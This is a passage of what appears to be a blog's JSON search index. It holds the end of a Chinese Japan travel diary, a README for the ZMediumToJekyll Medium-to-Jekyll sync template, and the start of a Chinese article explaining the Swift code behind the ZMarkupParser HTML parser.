日圓憑護照才能免稅，會用塑膠袋封起來，回國才能拆封（以上是回家拍的，在境內拆封如果出境查到可能要補稅，但感覺也沒在查；但如果要合規定記得注意液體只能托運，如果封起來的東西裡面有液體就只能整包托運）。吃的部分除了有名的零食之外，我比較多找百年老店的地產，不保證好吃但保證百年；大家推薦的零食保證好吃，但保證要排隊+不是百年ＸＤ最後心得還是找好吃的吧！後記第一次去日本直接愛上，回來開始查下一次的日本行程。 其實我 6/7–11 就又跑去東京了 😝 遊記下集待續總體來說，交通方便、安靜、氣侯怡人(五月去體感大約是台灣秋天天氣，晚上會涼)、人與人有邊界感、有禮貌；很喜歡！消費照目前日幣幣值跟物價，其實比台灣還便宜。。。住行： 電車、公車比台灣覆蓋率更高更方便；去這麼多天只有第一天去飯店搭過計程車。 承上雖然交通方便，但日本幅員遼闊，大部分時候腳要夠勤，每天都走快 20,000 步 站左站右不一定，在京都站左在大阪又變站右 公車會等人坐好才開、下車會等你起身慢慢下車；所以不需要在還沒到站就開始騷動，日本人也不喜歡這樣 飯店衛浴，都非常乾淨舒服；再小都有浴缸 馬桶幾乎都是免治馬桶，如果是百貨公司的還會有背景水聲(防尷尬)5/23–5/28 步數巔峰文化： 市容整潔且一體性很強 (e.g. 門口都長一樣，不會出現有幾戶有鞋櫃有幾戶沒有，有就都有沒有就都沒有) 沒有人邊走邊吃，都是在店門口吃完再走 垃圾只能帶回飯店，路邊很少垃圾桶，因此在門口吃完把垃圾還給店家最方便 店家只收自己店家的垃圾 英文基本上不通，只能用很簡單的跟比手畫腳；或用翻譯溝通；但藥妝店、大型購物中心基本上都有中文店員 買票、收據、找錢、給錢要記得直接放/從盤子拿，不要接觸到店員 避免肢體接觸及靠太近 公共運輸上普遍很安靜，尤其公車 拍照攝影盡量不要對著人拍或拍到人臉，上傳社群應該對人臉打馬賽克 拍廟宇要斜拍，不能正拍 重視細節 SOP，另外感覺要融入日本並不容易 日本人普遍穿著很正式或至少會打扮，女生也都很精緻 另外也不要說別人怎樣，我們在環球影城就遇到台灣(他貼🇹🇼在包包上)類似直銷公司的員工旅遊很大聲的在裡面喊口號拍影片「喊什麼 super 讚，業績直直讚」什麼的；因為人本來就多，還擋在路中間，一群人在那喊口號，沒拍好還一直重複拍重複喊，很丟臉。回歸到工作、「產品」上我自己的感覺是如果要攻日本市場，如果單純靠廣告跟市場行銷應該會很困難，頂多打到一些想嚐鮮的人；日本有很強的文化一體性，要想辦法融入他們的生活跟習慣才有機會得到他們的心。另外就是容錯性很低，例如 Bug、意外出現其他語言；對我們來說可能覺得一兩次還好或至少不要常發生就好；對他們來說我覺得是一次可能就黑掉了，因為這個東西不夠嚴謹、不夠重視他們。— — —👑最後附上最 Carry 的旅伴 黃馨平關西行成功！KKday 推廣 【一人成行】京都天橋立一日遊｜伊根灣遊船・天橋立・美山茅屋之里｜大阪難波出發 海之京都《神隱少女》觀光列車一日遊｜丹後紅松號／黑松號・天橋立 View Land・ 觀光船・傘松公園｜大阪出發 【1人成行】京都奈良一日遊｜嵐山＆伏見稻荷大社＆金閣寺＆奈良公園｜可選日式午餐方案（大阪、京都出發） 日本環球影城｜環球影城 Universal Studios Japan 門票 &amp; 環球特快入場券（快速通關 Express Pass） 日本 JR PASS|關西地區鐵路周遊券|eMCO 電子票 日本 JR PASS|關西廣域鐵路周遊券|eMCO 電子票 關西&amp;山陰地區鐵路周遊券 JRPass 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 1,367 Total Views Last Statistics Date: 2025-01-19 | 1,355 Views on Medium. " }, { "title": "ZMediumToJekyll", "url": "/posts/e7c547a5be22/", "categories": "ZRealm Dev.", "tags": "medium, post, medium-backup, ios-app-development, markdown", "date": "2023-03-18 02:47:07 +0800", "snippet": "ZMediumToJekyllMove your Medium posts to a Jekyll blog and keep them in sync in the future.This tool can help you move your Medium posts to a Jekyll blog and keep them in sync in the future.It will...", "content": "ZMediumToJekyllMove your Medium posts to a Jekyll blog and keep them in sync in the future.This tool can help you move your Medium posts to a Jekyll blog and keep them in sync in the future.It will automatically download your posts from Medium, convert them to Markdown, and upload them to your repository, check out my blog for online demo zhgchg.li .One-time setting, Lifetime enjoying❤️Powered by ZMediumToMarkdown .If you only want to create a backup or auto-sync of your Medium posts, you can use the GitHub Action directly by following the instructions in this Wiki .Setup You can follow along with each step of this process by watching the following video tutorial Click the green button Use this template located above and select Create a new repository . Repo Owner could be an organization or username Enter the Repository Name, which usually uses your GitHub Username/Organization Name and ends with .github.io , for example, my organization name is zhgchgli than it’ll be zhgchgli.github.io . Select the public repository option, and then click on Create repository from template . Grant access to GitHub Actions by going to the Settings tab in your GitHub repository, selecting Actions -&gt; General , and finding the Workflow permissions section , then, select Read and write permissions , and click on Save to save the changes.*If you choose a different Repository Name, the GitHub page will be https://username.github.io/Repository Name instead of https://username.github.io/ , and you will need to fill in the baseurl field in _config.yml with your Repository Name.*If you are using an organization and cannot enable Read and Write permissions in the repository settings, please refer to the organization settings page and enable it there.First-time run Please refer to the configuration information in the section below and make sure to specify your Medium username in the _zmediumtomarkdown.yml file. ⌛️ Please wait for the Automatic Build and pages-build-deployment gitHub actions to finish before making any further changes. Then, you can manually run the ZMediumToMarkdown GitHub action by going to the Actions tab in your GitHub repository, selecting the ZMediumToMarkdown action, clicking on the Run workflow button, and selecting the main branch. ⌛️ Please wait for the action to download and convert all Medium posts from the specified username, and commit the posts to your repository. ⌛️ Please wait for the Automatic Build and pages-build-deployment actions will also need to finish before making any further changes, and that they will start automatically once the ZMediumToMarkdown action has completed. Go to the Settings section of your GitHub repository and select Pages , In the Branch field, select gh-pages , and leave /(root) selected as the default. Click Save , you can also find the URL for your GitHub page at the top of the page. ⌛️ Please wait the Pages build and deployment action to finish. 🎉 After all actions are completed, you can visit your xxx.github.io page to verify that the results are correct. Congratulations! 🎉*To avoid expected Git conflicts or unexpected errors, please follow the steps carefully and in order, and be patient while waiting for each action to complete.*Note that the first time running may take longer.*If you open the URL and notice that something is wrong, such as the web style being missing, please ensure that your configuration in the _config.yml file is correct.*Please refer to the ‘Things to Know’ and ‘Troubleshooting’ sections below for more information.ConfigurationSite Setting_zmediumtomarkdown.ymlmedium_username: # enter your username on Medium.comPlease specify your Medium username for automatic download and syncing of your posts._config.yml &amp; jekyll settingFor more information, please refer to jekyll-theme-chirpy or jekyllrb .Github ActionZMediumToMarkdownYou can configure the time interval for syncing in ./.github/workflows/ZMediumToMarkdown.yml .The default time interval for syncing is once per day.You can also manually run the ZMediumToMarkdown action by going to the Actions tab in your GitHub repository, selecting the ZMediumToMarkdown action, clicking on the Run workflow button, and selecting the main branch.DisclaimerAll content downloaded using ZMediumToMarkdown, including but not limited to articles, images, and videos, are subject to copyright laws and belong to their respective owners. ZMediumToMarkdown does not claim ownership of any content downloaded using this tool.Downloading and using copyrighted content without the owner’s permission may be illegal and may result in legal action. ZMediumToMarkdown does not condone or support copyright infringement and will not be held responsible for any misuse of this tool.Users of ZMediumToMarkdown are solely responsible for ensuring that they have the necessary permissions and rights to download and use any content obtained using this tool. ZMediumToMarkdown is not responsible for any legal issues that may arise from the misuse of this tool.By using ZMediumToMarkdown, users acknowledge and agree to comply with all applicable copyright laws and regulations.TroubleshootingMy GitHub page keeps presenting a 404 error or doesn’t update with the latest posts. Please make sure you have followed the setup steps above in order. Wait for all GitHub actions to finish, including the Pages build and deployment and Automatic Build actions, you can check the progress on the Actions tab. Make sure you have the correct settings selected in Settings -&gt; Pages .Things to know The ZMediumToMarkdown GitHub Action for syncing Medium posts will automatically run every day by default, and you can also manually trigger it on the GitHub Actions page or adjust the sync frequency as needed. Every commit and post change will trigger the Automatic Build &amp; Pages build and deployment action. Please wait for this action to finish before checking the final result. You can create your own Markdown posts in the _posts directory by naming the file as YYYY-MM-DD-POSTNAME and recommend using lowercase file names. You can include images and other resources in the /assets directory. Also, if you would like to remove the ZMediumToMarkdown watermark located at the bottom of the post, you may do so. I don’t mind. You can edit the Ruby file at tools/optimize_markdown.rb and uncomment lines 10–12 . This will automatically remove the ZMediumToMarkdown watermark at the end of all posts during Jekyll build time. Since ZMediumToMarkdown is not an official tool and Medium does not provide a public API for it, I cannot guarantee that the parser target will not change in the future. However, I have tried to test it for as many cases as possible. If you encounter any rendering errors or Jekyll build errors, please feel free to create an issue and I will fix them as soon as possible.有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 47 Total Views Last Statistics Date: 2025-01-19 | 32 Views on Medium. " }, { "title": "手工打造 HTML 解析器的那些事", "url": "/posts/2724f02f6e7/", "categories": "ZRealm Dev.", "tags": "ios-app-development, html-parsing, nsattributedstring, html, rendering", "date": "2023-03-12 01:09:22 +0800", "snippet": "手工打造 HTML 解析器的那些事ZMarkupParser HTML to NSAttributedString 渲染引擎的開發實錄HTML String 的 Tokenization 轉換、Normalization 處理、Abstract Syntax Tree 的產生、Visitor Pattern / Builder Pattern 的應用, 還有一些雜談…接續去年發表了篇「[ T...", "content": "手工打造 HTML 解析器的那些事ZMarkupParser HTML to NSAttributedString 渲染引擎的開發實錄HTML String 的 Tokenization 轉換、Normalization 處理、Abstract Syntax Tree 的產生、Visitor Pattern / Builder Pattern 的應用, 還有一些雜談…接續去年發表了篇「[ TL;DR] 自行實現 iOS NSAttributedString HTML Render 」的文章，粗淺的介紹可以使用 XMLParser 去剖析 HTML 再將其轉換成 NSAttributedString.Key，文中的程式架構及思路都很零亂，因是過水紀錄一下之前遇到的問題及當初並沒有花太多時間研究此議題。Convert HTML String to NSAttributedString再次重新探討此議題，我們需要能將 API 給的 HTML 字串轉換成 NSAttributedString ，並套用對應樣式放到 UITextView/UILabel 中顯示。e.g. &lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt; 要能顯示成 Test Link 註1不建議使用 HTML 做為 App 與資料間的溝通渲染媒介，因 HTML 規格過於彈性，App 無法支援所有 HTML 樣式，也沒有官方的 HTML 轉換渲染引擎。 註2iOS 14 開始可使用官方原生的 AttributedString 解析 Markdown或引入 apple/swift-markdown Swift Package 解析 Markdown。 註3因敝司專案龐大且已應用 HTML 做為媒介多年，所以暫時無法全面更換為 Markdown 或其他 Markup。 註4 這邊的 HTML 並不是要用來顯示整個 HTML 網頁，只是把 HTML 做為樣式 Markdown 渲染字串樣式。 (要渲染整頁、複雜包含圖片表格的 HTML，依然要使用 WevView loadHTML) 強烈建議使用 Markdown 做為字串渲染媒介語言，如果您的專案跟我有一樣困擾不得不使用 HTML 並苦無優雅的 to NSAttributedString 轉換工具， 再請使用。 還記得上一篇文章的朋友也可以直接跳到 ZhgChgLi / ZMarkupParser 章節。NSAttributedString.DocumentType.html網路上能找到的 HTML to NSAttributedString 的做法都是要我們直接使用 NSAttributedString 自帶的 options 渲染 HTML，範例如下：let htmlString = \"&lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt;\"let data = htmlString.data(using: String.Encoding.utf8)!let attributedOptions:[NSAttributedString.DocumentReadingOptionKey: Any] = [ .documentType :NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue]let attributedString = try! NSAttributedString(data: data, options: attributedOptions, documentAttributes: nil)此做法的問題： 效能差：此方法是透過 WebView Core 去渲染出樣式，再切回 Main Thread 給 UI 顯示；渲染 300 多個字元就需 0.03 Sec。 會吃字：例如行銷文案可能會使用 &lt;Congratulation!&gt; 會被當成 HTML Tag 被去除掉。 無法客製化：例如無法指定 HTML 的粗體在 NSAttributedString 中對應的粗體程度。 iOS ≥ 12 開始會零星閃退的問題且官方無解 在 iOS 15 出現 大量閃退 ，測試發現低電量情況下會 100% 閃退 (iOS ≥ 15.2 已修正) 字串太長會閃退，實測輸入超過 54,600+ 長度字串就會 100% 閃退 (EXC_BAD_ACCESS)對與我們最痛的還是閃退問題，iOS 15 發佈到 15.2 修正之前，App 始終被此問題霸榜，從數據來看，2022/03/11~2022/06/08 就造成了 2.4K+ 次閃退、影響 1.4K+ 位使用者。此閃退問題自 iOS 12 開始就有，iOS 15 只是踩到更大的坑，但我猜 iOS 15.2 的修正也只是補洞，官方無法根除。其次問題是效能，因為做為字串樣式 Markup Language，會大量應用在 App 上的 UILabel/UITextView，如同前述一個 Label 就需要 0.03 Sec，列表*UILabel/UITextView 乘下來就會對使用者操作手感上產生卡頓。XMLParser第二個方案是 上篇文章 介紹的，使用 XMLParser 解析成對應的 NSAttributedString Key 並套用樣式。可參考 SwiftRichString 的實現及 上一篇文章內容 。 上一篇也只是探究出可以使用 XMLParser 解析 HTML 並做對應轉換，然後完成實驗性的實作，但並沒有把它設計成一個有架構好擴充的「工具」。此做法的問題： 容錯率 0： &lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; 以上三種 HTML 有可能出現的情境，在 XMLParser 解析都會出錯直接 Throw Error 顯示空白。 使用 XMLParser，HTML 字串必須完全符合 XML 規則，無法像瀏覽器或 NSAttributedString.DocumentType.html 容錯正常顯示。站在巨人的肩膀上以上兩個方案都不能完美優雅的解決 HTML 問題，於是開始搜尋有無現成的解決方案。 johnxnguyen / Down 只支援輸入 Markdown 轉換成 Any (XML/NSAttributedString…)，但不支援輸入 HTML 轉換。 malcommac / SwiftRichString 底層是使用 XMLParser，實測前述案例也會有一樣容錯率 0 的問題。 scinfu / SwiftSoup 只支援 HTML Parser(Selector) 不支援轉換成 NSAttributedString 。 找了一大圈結果都類似上方的專案 Orz，沒有巨人的肩膀可以站。ZhgChgLi/ZMarkupParser沒有巨人的肩膀，只好自己當巨人了，於是自行開發了 HTML String to NSAttributedString 工具。使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenization，分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)，再轉換成 abstract syntax tree，最終使用 Visitor Pattern 將 HTML Tag 與抽象樣式對應，得到最終 NSAttributedString 結果；其中不依賴任何 Parser Lib。特色 支援 HTML Render (to NSAttributedString) / Stripper (剝離 HTML Tag) / Selector 功能 比 NSAttributedString.DocumentType.html 更高的效能 自動分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag) 支援從 style=”color:red…” 動態設定樣式 支援客製化樣式指定，例如粗體要多 粗 支援彈性可擴充標籤或自訂標籤及屬性 詳細介紹、安裝使用可參考此篇文章：「 ZMarkupParser HTML String 轉換 NSAttributedString 工具 」可直接 git clone 專案 後，打開 ZMarkupParser.xcworkspace Project 選擇 ZMarkupParser-Demo Target 直接 Build &amp; Run 起來玩玩。ZMarkupParser技術細節再來才是本篇文章想分享的，關於開發這個工具上的技術細節。運作流程總覽上圖為大概的運作流程，後面文章會一步一步介紹及附上程式碼。 ⚠️️️️️️ 本文會盡量簡化 Demo Code、減少抽象跟效能考量，盡量把重心放在解釋運作原理上；如需了解最終結果請參考專案 Source Code 。程式碼化 — Tokenization a.k.a parser, 解析談到 HTML 渲染最重要的就是解析的環節，以往是透過 XMLParser 將 HTML 做為 XML 解析；但是無法克服 HTML 日常用法並不是 100% 的 XML 會造成解析器錯誤，且無法動態修正。排除掉使用 XMLParser 這條路之後，在 Swift 上留給我們的就只剩使用 Regex 正則來做匹配解析了。最一開始沒想太多，想說可以直接用正則挖出「成對」的 HTML Tag，再遞迴往裡面一層一層找 HTML Tag，直到結束；但是這樣沒有辦法解決 HTML Tag 可以嵌套，或想支援錯位容錯的問題，因此我們把策略改成挖成出「單個」 HTML Tag，並記錄是 Start Tag, Close Tag or Self-Closing Tag，及其他字串組合成解析結果陣列。Tokenization 結構如下：enum HTMLParsedResult { case start(StartItem) // &lt;a&gt; case close(CloseItem) // &lt;/a&gt; case selfClosing(SelfClosingItem) // &lt;br/&gt; case rawString(NSAttributedString)}extension HTMLParsedResult { class SelfClosingItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } } class StartItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? // Start Tag 有可能是異常 HTML Tag 也有可能是正常文字 e.g. &lt;Congratulation!&gt;, 後續 Normalization 後如果發現是孤立 Start Tag 則標記為 True。 var isIsolated: Bool = false init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } // 後續 Normalization 自動補位修正使用 func convertToCloseParsedItem() -&gt; CloseItem { return CloseItem(tagName: self.tagName) } // 後續 Normalization 自動補位修正使用 func convertToSelfClosingParsedItem() -&gt; SelfClosingItem { return SelfClosingItem(tagName: self.tagName, tagAttributedString: self.tagAttributedString, attributes: self.attributes) } } class CloseItem { let tagName: String init(tagName: String) { self.tagName = tagName } }}使用的正則如下：&lt;(?:(?&lt;closeTag&gt;\\/)?(?&lt;tagName&gt;[A-Za-z0-9]+)(?&lt;tagAttributes&gt;(?:\\s*(\\w+)\\s*=\\s*([\"|']).*?\\5)*)\\s*(?&lt;selfClosingTag&gt;\\/)?&gt;)-&gt; Online Regex101 Playground closeTag: 匹配 &lt; / a&gt; tagName: 匹配 &lt; a &gt; or , &lt;/ a &gt; tagAttributes: 匹配 &lt;a href=”https://zhgchg.li” style=”color:red” &gt; selfClosingTag: 匹配 &lt;br / &gt; *此正則還可以再優化，之後再來做 文章後半段有提供關於正則的附加資料，有興趣的朋友可以參考。組合起來就是：var tokenizationResult: [HTMLParsedResult] = []let expression = try? NSRegularExpression(pattern: pattern, options: expressionOptions)let attributedString = NSAttributedString(string: \"&lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;\")let totalLength = attributedString.string.utf16.count // utf-16 support emojivar lastMatch: NSTextCheckingResult?// Start Tags Stack, 先進後出(FILO First In Last Out)// 檢測 HTML 字串是否需要後續 Normalization 修正錯位或補 Self-Closing Tagvar stackStartItems: [HTMLParsedResult.StartItem] = []var needForamatter: Bool = falseexpression.enumerateMatches(in: attributedString.string, range: NSMakeRange(0, totoalLength)) { match, _, _ in if let match = match { // 檢查 Tag 之間或是到第一個 Tag 之間的字串 // e.g. Test&lt;a&gt;Link&lt;/a&gt;zzz&lt;b&gt;bold&lt;/b&gt;Test2 - &gt; Test,zzz let lastMatchEnd = lastMatch?.range.upperBound ?? 0 let currentMatchStart = match.range.lowerBound if currentMatchStart &gt; lastMatchEnd { let rawStringBetweenTag = attributedString.attributedSubstring(from: NSMakeRange(lastMatchEnd, (currentMatchStart - lastMatchEnd))) tokenizationResult.append(.rawString(rawStringBetweenTag)) } // &lt;a href=\"https://zhgchg.li\"&gt;, &lt;/a&gt; let matchAttributedString = attributedString.attributedSubstring(from: match.range) // a, a let matchTag = attributedString.attributedSubstring(from: match.range(withName: \"tagName\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() // false, true let matchIsEndTag = matchResult.attributedString(from: match.range(withName: \"closeTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" // href=\"https://zhgchg.li\", nil // 用正則再拆出 HTML Attribute, to [String: String], 請參考 Source Code let matchTagAttributes = parseAttributes(matchResult.attributedString(from: match.range(withName: \"tagAttributes\"))) // false, false let matchIsSelfClosingTag = matchResult.attributedString(from: match.range(withName: \"selfClosingTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" if let matchAttributedString = matchAttributedString, let matchTag = matchTag { if matchIsSelfClosingTag { // e.g. &lt;br/&gt; tokenizationResult.append(.selfClosing(.init(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes))) } else { // e.g. &lt;a&gt; or &lt;/a&gt; if matchIsEndTag { // e.g. &lt;/a&gt; // 從 Stack 取出出現相同 TagName 的位置，從最後開始 if let index = stackStartItems.lastIndex(where: { $0.tagName == matchTag }) { // 如果不是最後一個，代表有錯位或遺漏關閉的 Tag if index != stackStartItems.count - 1 { needForamatter = true } tokenizationResult.append(.close(.init(tagName: matchTag))) stackStartItems.remove(at: index) } else { // 多餘的 close tag e.g &lt;/a&gt; // 不影響後續，直接忽略 } } else { // e.g. &lt;a&gt; let startItem: HTMLParsedResult.StartItem = HTMLParsedResult.StartItem(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes) tokenizationResult.append(.start(startItem)) // 塞到 Stack stackStartItems.append(startItem) } } } lastMatch = match }}// 檢查結尾的 RawString// e.g. Test&lt;a&gt;Link&lt;/a&gt;Test2 - &gt; Test2if let lastMatch = lastMatch { let currentIndex = lastMatch.range.upperBound if totoalLength &gt; currentIndex { // 還有剩餘字串 let resetString = attributedString.attributedSubstring(from: NSMakeRange(currentIndex, (totoalLength - currentIndex))) tokenizationResult.append(.rawString(resetString)) }} else { // lastMatch = nil, 代表沒找到任何標籤，全都是純文字 let resetString = attributedString.attributedSubstring(from: NSMakeRange(0, totoalLength)) tokenizationResult.append(.rawString(resetString))}// 檢查 Stack 是否已經清空，如果還有代表有 Start Tag 沒有對應的 End// 標記成孤立 Start Tagfor stackStartItem in stackStartItems { stackStartItem.isIsolated = true needForamatter = true}print(tokenizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"a\")// .rawString(\"Bold\")// .close(\"b\")// ]運作流程如上圖最終會得到一個 Tokenization 結果陣列。 對應原始碼中的 HTMLStringToParsedResultProcessor.swift 實作標準化 — Normalization a.k.a Formatter, 正規化繼上一步取得初步解析結果後，解析中如果發現還需要 Normalization，則需要此步驟，自動修正 HTML Tag 問題。HTML Tag 問題有以下三種： HTML Tag 但遺漏 Close Tag: 例如 &lt;br&gt; 一般文字被當成 HTML Tag: 例如 &lt;Congratulation!&gt; HTML Tag 存在錯位問題: 例如 &lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;修正方式也很簡單，我們需要遍歷 Tokenization 結果的元素，嘗試補齊缺漏。運作流程如上圖var normalizationResult = tokenizationResult// Start Tags Stack, 先進後出(FILO First In Last Out)var stackExpectedStartItems: [HTMLParsedResult.StartItem] = []var itemIndex = 0while itemIndex &lt; newItems.count { switch newItems[itemIndex] { case .start(let item): if item.isIsolated { // 如果為孤立 Start Tag if WC3HTMLTagName(rawValue: item.tagName) == nil &amp;&amp; (item.attributes?.isEmpty ?? true) { // 如果不是 WCS 定義的 HTML Tag &amp; 沒有任何 HTML Attribute // WC3HTMLTagName Enum 可參考 Source Code // 判定為 一般文字被當成 HTML Tag // 改成 raw string type normalizationResult[itemIndex] = .rawString(item.tagAttributedString) } else { // 否則，改成 self-closing tag, e.g. &lt;br&gt; -&gt; &lt;br/&gt; normalizationResult[itemIndex] = .selfClosing(item.convertToSelfClosingParsedItem()) } itemIndex += 1 } else { // 正常 Start Tag, 加入 Stack stackExpectedStartItems.append(item) itemIndex += 1 } case .close(let item): // 遇到 Close Tag // 取得 Start Stack Tag 到此 Close Tag 中間隔的 Tags // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; 間隔 0 // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; 間隔 b,u let reversedStackExpectedStartItems = Array(stackExpectedStartItems.reversed()) guard let reversedStackExpectedStartItemsOccurredIndex = reversedStackExpectedStartItems.firstIndex(where: { $0.tagName == item.tagName }) else { itemIndex += 1 continue } let reversedStackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItems.prefix(upTo: reversedStackExpectedStartItemsOccurredIndex)) // 間隔 0, 代表 tag 沒錯位 guard reversedStackExpectedStartItemsOccurred.count != 0 else { // is pair, pop stackExpectedStartItems.removeLast() itemIndex += 1 continue } // 有其他間隔，自動在前候補期間格 Tag // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;b&gt;&lt;/u&gt;&lt;/u&gt;&lt;/b&gt; let stackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItemsOccurred.reversed()) let afterItems = stackExpectedStartItemsOccurred.map({ HTMLParsedResult.start($0) }) let beforeItems = reversedStackExpectedStartItemsOccurred.map({ HTMLParsedResult.close($0.convertToCloseParsedItem()) }) normalizationResult.insert(contentsOf: afterItems, at: newItems.index(after: itemIndex)) normalizationResult.insert(contentsOf: beforeItems, at: itemIndex) itemIndex = newItems.index(after: itemIndex) + stackExpectedStartItemsOccurred.count // 更新 Start Stack Tags // e.g. -&gt; b,u stackExpectedStartItems.removeAll { startItem in return reversedStackExpectedStartItems.prefix(through: reversedStackExpectedStartItemsOccurredIndex).contains(where: { $0 === startItem }) } case .selfClosing, .rawString: itemIndex += 1 }}print(normalizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"b\")// .close(\"a\")// .start(\"b\",nil)// .rawString(\"Bold\")// .close(\"b\")// ] 對應原始碼中的 HTMLParsedResultFormatterProcessor.swift 實作Abstract Syntax Tree a.k.a AST, 抽象樹經過 Tokenization &amp; Normalization 資料預處理完成後，再來要將結果轉換成抽象樹🌲。如上圖轉換成抽象樹可以方便我們日後的操作及擴充，例如實現 Selector 功能或是做其他轉換，例如 HTML To Markdown；亦或是日後想增加 Markdown to NSAttributedString，只需實現 Markdown 的 Tokenization &amp; Normalization 就能完成。首先我們定義一個 Markup Protocol，有 Child &amp; Parent 屬性，紀錄葉子跟樹枝的資訊:protocol Markup: AnyObject { var parentMarkup: Markup? { get set } var childMarkups: [Markup] { get set } func appendChild(markup: Markup) func prependChild(markup: Markup) func accept&lt;V: MarkupVisitor&gt;(_ visitor: V) -&gt; V.Result}extension Markup { func appendChild(markup: Markup) { markup.parentMarkup = self childMarkups.append(markup) } func prependChild(markup: Markup) { markup.parentMarkup = self childMarkups.insert(markup, at: 0) }}另外搭配使用 Visitor Pattern ，將每種樣式屬性都定義成一個物件 Element，再透過不同的 Visit 策略取得個別的套用結果。protocol MarkupVisitor { associatedtype Result func visit(markup: Markup) -&gt; Result func visit(_ markup: RootMarkup) -&gt; Result func visit(_ markup: RawStringMarkup) -&gt; Result func visit(_ markup: BoldMarkup) -&gt; Result func visit(_ markup: LinkMarkup) -&gt; Result //...}extension MarkupVisitor { func visit(markup: Markup) -&gt; Result { return markup.accept(self) }}基本 Markup 節點：// 根節點final class RootMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// 葉節點final class RawStringMarkup: Markup { let attributedString: NSAttributedString init(attributedString: NSAttributedString) { self.attributedString = attributedString } weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}定義 Markup 樣式節點：// 樹枝節點:// 連結樣式final class LinkMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// 粗體樣式final class BoldMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }} 對應原始碼中的 Markup 實作轉換成抽象樹之前我們還需要…MarkupComponent因為我們的樹結構不與任何資料結構有依賴(例如 a 節點/LinkMarkup，應該要有 url 資訊才能做後續 Render)。 對此我們另外定義一個容器存放樹節點與節點相關的資料資訊:protocol MarkupComponent { associatedtype T var markup: Markup { get } var value: T { get } init(markup: Markup, value: T)}extension Sequence where Iterator.Element: MarkupComponent { func value(markup: Markup) -&gt; Element.T? { return self.first(where:{ $0.markup === markup })?.value as? Element.T }} 對應原始碼中的 MarkupComponent 實作也可將 Markup 宣告 Hashable ，直接使用 Dictionary 存放值 [Markup: Any] ，但是這樣 Markup 就不能被當一般 type 使用，要加上 any Markup 。HTMLTag &amp; HTMLTagName &amp; HTMLTagNameVisitorHTML Tag Name 部分我們也做了一層的抽象，讓使用者能自行決定有哪些 Tag 需要被處理，也能方便日後的擴充，例如: &lt;strong&gt; Tag Name 同樣可對應到 BoldMarkup 。public protocol HTMLTagName { var string: String { get } func accept&lt;V: HTMLTagNameVisitor&gt;(_ visitor: V) -&gt; V.Result}public struct A_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.a.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}public struct B_HTMLTagName: HTMLTagName { public let string: String = 